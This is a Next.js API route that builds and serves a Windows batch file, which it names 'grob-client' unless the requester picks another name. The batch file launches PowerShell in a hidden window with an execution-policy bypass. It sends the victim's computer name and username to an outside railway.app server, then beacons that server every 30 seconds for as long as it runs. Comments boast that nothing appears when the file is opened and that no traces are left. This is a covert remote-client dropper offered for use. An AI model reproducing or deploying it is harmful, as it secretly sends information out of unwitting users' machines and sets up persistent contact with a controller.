import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const userUid = formData.get("userUid") as string
    const fileName = formData.get("fileName") as string || "grob-client"

    if (!userUid) {
      return NextResponse.json({ error: "UID required" }, { status: 400 })
    }

    // Create COMPLETELY HIDDEN client - NO windows, NO messages
    const batchContent = `@echo off
:: COMPLETELY HIDDEN - NO WINDOW, NO MESSAGES
:: User opens file - NOTHING appears, but client connects immediately

powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
$uid = '${userUid}'
$computer = $env:COMPUTERNAME
$username = $env:USERNAME

:: Connect to server immediately
try {
    $body = @{
        uid = $uid
        computer_name = $computer
        username = $username
        status = 'online'
        timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    } | ConvertTo-Json
    
    Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/connect' -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 10
} catch {
    :: Even if connection fails, continue running
}

:: Keep running in background forever
while ($true) {
    try {
        $heartbeat = @{
            uid = $uid
            status = 'online'
            timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/heartbeat' -Method POST -Body $heartbeat -ContentType 'application/json' -TimeoutSec 5
    } catch {
        :: Continue even if heartbeat fails
    }
    
    Start-Sleep -Seconds 30
}
" :: End of PowerShell command

:: Exit immediately - no traces left
exit`

    return new NextResponse(batchContent, {
      status: 200,
      headers: {
        "Content-Type": "text/plain",
        "Content-Disposition": `attachment; filename="${fileName}.bat"`,
      },
    })

  } catch (error: any) {
    return NextResponse.json(
      { error: "Build failed", details: error.message },
      { status: 500 }
    )
  }
}
